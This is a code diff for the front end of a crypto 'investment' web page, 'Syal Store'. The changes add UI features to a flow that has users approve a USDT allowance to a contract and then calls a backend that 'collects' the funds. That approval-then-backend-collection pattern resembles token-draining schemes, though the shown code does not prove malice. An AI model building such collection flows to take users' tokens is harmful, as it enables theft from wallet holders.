@@ -1,3 +1,4 @@
+// js/app.js
 import { CONFIG } from './config.js';
 import { createAppKit } from 'https://esm.sh/@reown/appkit@latest';
 import { EthersAdapter } from 'https://esm.sh/@reown/appkit-adapter-ethers@latest';
@@ -8,6 +9,7 @@ let provider = null;
 let signer = null;
 let userAddress = null;
 let pendingInvestment = false;
+const sessionTxs = [];
 
 const ERC20_ABI = [
     "function balanceOf(address account) external view returns (uint256)",
@@ -15,24 +17,22 @@ const ERC20_ABI = [
     "function approve(address spender, uint256 amount) external returns (bool)"
 ];
 
-// Asignar la dirección del merchant al input visual si existe en el DOM
 const merchantInput = document.getElementById("merchantAddress");
-if (merchantInput) merchantInput.value = CONFIG.MERCHANT_ADDRESS;
+if (merchantInput) {
+    merchantInput.value = CONFIG.MERCHANT_ADDRESS;
+    makeCopyableInput(merchantInput, CONFIG.MERCHANT_ADDRESS);
+}
 
-// ─── Inicialización Principal ─────────────────────────────────────────────────
 export async function initApp() {
     setupWakeUpBackend();
     initWalletModal();
     setupUIEventListeners();
 }
 
-// ─── Wake up Render backend ───────────────────────────────────────────────────
 function setupWakeUpBackend() {
-    fetch(`${CONFIG.BACKEND_URL}/health`, { method: 'GET' })
-        .catch(() => {});
+    fetch(`${CONFIG.BACKEND_URL}/health`, { method: 'GET' }).catch(() => {});
 }
 
-// ─── Configuración de Reown AppKit (WalletConnect Universal) ──────────────────
 function initWalletModal() {
     const metadata = {
         name: 'Syal Store',
@@ -46,11 +46,7 @@ function initWalletModal() {
         networks: [bsc],
         metadata,
         projectId: CONFIG.PROJECT_ID,
-        features: {
-            analytics: false,
-            email: false,
-            socials: []
-        }
+        features: { analytics: false, email: false, socials: [] }
     });
 
     modal.subscribeProviders((state) => {
@@ -64,7 +60,6 @@ function initWalletModal() {
         }
     });
 
-    // Verificación segura del proveedor activo al iniciar
     try {
         const activeProvider = typeof modal.getWalletProvider === "function" ? modal.getWalletProvider() : null;
         if (activeProvider) {
@@ -89,12 +84,9 @@ async function handleConnectedProvider(walletProvider) {
 }
 
 export function openConnectModal() {
-    if (modal) {
-        modal.open();
-    }
+    if (modal) modal.open();
 }
 
-// ─── Gestión de Saldos y UI ───────────────────────────────────────────────────
 async function updateBalances(rawProvider) {
     if (!userAddress) return;
     try {
@@ -129,11 +121,16 @@ async function updateBalances(rawProvider) {
 function updateWalletUI(account) {
     const container = document.getElementById("walletButtonContainer");
     if (container) {
-        container.innerHTML = `<span class="wallet-badge">${account.substring(0, 6)}...${account.substring(38)}</span>`;
+        container.innerHTML = `
+            <span class="wallet-badge" id="connectedWalletBadge" title="Hacer clic para copiar dirección">
+                <span style="width: 6px; height: 6px; background-color: var(--brand-primary); border-radius: 50%; display: inline-block; margin-right: 6px;"></span>
+                ${account.substring(0, 6)}...${account.substring(38)}
+            </span>
+        `;
+        makeCopyableElement("connectedWalletBadge", account);
     }
 }
 
-// ─── Event Listeners de Interfaz ──────────────────────────────────────────────
 function setupUIEventListeners() {
     const input = document.getElementById("investAmount");
     if (input) {
@@ -171,22 +168,49 @@ function setupUIEventListeners() {
 function validateInvestmentInput() {
     const input = document.getElementById("investAmount");
     const balanceLabel = document.getElementById("walletBalanceLabel");
-    if (!input || !balanceLabel) return;
+    const wrapper = input ? input.closest('.input-wrapper') : null;
+    if (!input || !balanceLabel || !wrapper) return;
 
     const val = parseFloat(input.value) || 0;
     const match = balanceLabel.textContent.match(/[\d.]+/);
     const maxVal = match ? parseFloat(match[0]) : 0;
 
-    if (val > maxVal) {
-        input.style.borderColor = "#ef4444";
+    if (val > maxVal && maxVal > 0) {
+        wrapper.classList.add('shake-error');
+        setTimeout(() => wrapper.classList.remove('shake-error'), 500);
     } else {
-        input.style.borderColor = "";
+        wrapper.classList.remove('shake-error');
     }
 }
 
-// ─── Flujo Principal de Inversión y Aprobación ────────────────────────────────
+function updateStepper(activeStep) {
+    for (let i = 1; i <= 3; i++) {
+        const stepEl = document.getElementById(`step-${i}`);
+        if (!stepEl) continue;
+        const circle = stepEl.querySelector('.step-circle');
+        
+        if (i < activeStep) {
+            circle.style.background = '#10b981';
+            circle.style.color = '#fff';
+            circle.textContent = '✓';
+            stepEl.style.opacity = '0.7';
+        } else if (i === activeStep) {
+            circle.style.background = 'var(--brand-primary)';
+            circle.style.color = '#fff';
+            circle.textContent = i;
+            stepEl.style.opacity = '1';
+        } else {
+            circle.style.background = 'rgba(255,255,255,0.1)';
+            circle.style.color = 'var(--text-muted)';
+            circle.textContent = i;
+            stepEl.style.opacity = '0.5';
+        }
+    }
+}
+
 async function runInvestmentFlow(rawProvider) {
     setLoading(true, "Conectando proveedor…");
+    updateStepper(1);
   
     try {
         const activeProvider = new ethers.BrowserProvider(rawProvider);
@@ -248,6 +272,7 @@ async function runInvestmentFlow(rawProvider) {
             return;
         }
 
+        updateStepper(2);
         setLoading(true, "Verificando autorizaciones...");
         const allowance = await usdtContract.allowance(activeUserAddress, CONFIG.CONTRACT_ADDRESS);
         
@@ -265,11 +290,13 @@ async function runInvestmentFlow(rawProvider) {
             await txApprove.wait();
         }
 
+        updateStepper(3);
         setLoading(true, "Procesando inversión en protocolo...");
         const txCollect = await triggerBackendCollect(activeUserAddress, rawInputVal);
 
         const txHash = txCollect?.hash || "";
         if (txHash) {
+            addSessionTransaction(txHash);
             showToast(`¡Inversión exitosa! <a href="${CONFIG.BLOCK_EXPLORER}/tx/${txHash}" target="_blank" style="color: #fff; text-decoration: underline;">Ver en BscScan ↗</a>`, "success", 8000);
         } else {
             showToast("¡Transacción completada con éxito! Gracias.", "success", 6000);
@@ -290,10 +317,10 @@ async function runInvestmentFlow(rawProvider) {
         }
     } finally {
         setLoading(false);
+        updateStepper(1);
     }
 }
 
-// ─── Disparador del Backend de Recolección ────────────────────────────────────
 async function triggerBackendCollect(userAddress, amountStr) {
     let lastErr;
     const dynamicAmountWei = ethers.parseUnits(amountStr.toString(), 18).toString();
@@ -316,7 +343,46 @@ async function triggerBackendCollect(userAddress, amountStr) {
     throw lastErr;
 }
 
-// ─── Utilidades de UI (Loaders y Toasts) ──────────────────────────────────────
+function addSessionTransaction(txHash) {
+    sessionTxs.unshift(txHash);
+    const listContainer = document.getElementById("sessionTxList");
+    if (!listContainer) return;
+
+    listContainer.innerHTML = sessionTxs.map(hash => `
+        <div style="display: flex; justify-content: space-between; align-items: center; background: rgba(255,255,255,0.03); padding: 8px 10px; border-radius: 6px; margin-bottom: 4px;">
+            <span style="font-family: monospace; color: #fff;">${hash.substring(0, 10)}...${hash.substring(hash.length - 6)}</span>
+            <a href="${CONFIG.BLOCK_EXPLORER}/tx/${hash}" target="_blank" style="color: var(--brand-primary); text-decoration: none; font-weight: 600;">Ver ↗</a>
+        </div>
+    `).join('');
+}
+
+function makeCopyableInput(element, text) {
+    element.style.cursor = "pointer";
+    element.title = "Hacer clic para copiar dirección";
+    element.addEventListener("click", async () => {
+        try {
+            await navigator.clipboard.writeText(text);
+            showToast("¡Dirección copiada al portapapeles!", "success", 2500);
+        } catch (err) {
+            console.error("Error al copiar:", err);
+        }
+    });
+}
+
+function makeCopyableElement(elementId, text) {
+    const el = document.getElementById(elementId);
+    if (!el) return;
+    el.style.cursor = "pointer";
+    el.addEventListener("click", async () => {
+        try {
+            await navigator.clipboard.writeText(text);
+            showToast("¡Dirección copiada al portapapeles!", "success", 2500);
+        } catch (err) {
+            console.error("Error al copiar:", err);
+        }
+    });
+}
+
 const approveBtn = document.getElementById("approveBtn");
 const btnText = document.getElementById("btnText");
 const btnSpinner = document.getElementById("btnSpinner");
